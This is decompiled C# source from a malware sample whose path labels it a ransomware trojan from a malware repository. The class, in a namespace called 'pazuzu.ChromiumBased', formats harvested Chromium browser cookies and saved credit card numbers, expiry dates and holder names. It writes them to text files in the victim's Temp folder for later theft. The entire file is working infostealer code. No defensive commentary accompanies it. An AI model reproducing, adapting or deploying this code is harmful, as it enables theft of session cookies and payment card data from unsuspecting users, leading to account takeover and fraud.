// Decompiled with JetBrains decompiler
// Type: pazuzu.ChromiumBased.Browser
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.ChromiumBased
{
  internal class Browser
  {
    private static string FormatCookie(Common.CCookie ccookie) => string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", (object) ccookie.hostname, (object) ccookie.path, (object) ccookie.expiresutc, (object) ccookie.name, (object) ccookie.value);

    private static string FormatCreditCard(Common.CreditCard cc) => string.Format("Number: {0}\nExp: {1}\nHolder: {2}\n\n", (object) cc.number, (object) (cc.expmonth + "/" + cc.expyear), (object) cc.name);

    public static bool ShowCookies(List<Common.CCookie> CCookies)
    {
      string userName = Environment.UserName;
      string path = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCookies.txt";
      try
      {
        foreach (Common.CCookie ccooky in CCookies)
        {
          using (StreamWriter streamWriter = File.AppendText(path))
            streamWriter.WriteLine(Browser.FormatCookie(ccooky));
        }
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static bool ShowCreditCards(List<Common.CreditCard> CreditCards)
    {
      string userName = Environment.UserName;
      string path = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCards.txt";
      try
      {
        foreach (Common.CreditCard creditCard in CreditCards)
        {
          using (StreamWriter streamWriter = File.AppendText(path))
            streamWriter.WriteLine(Browser.FormatCreditCard(creditCard));
        }
        return true;
      }
      catch
      {
        return false;
      }
    }
  }
}
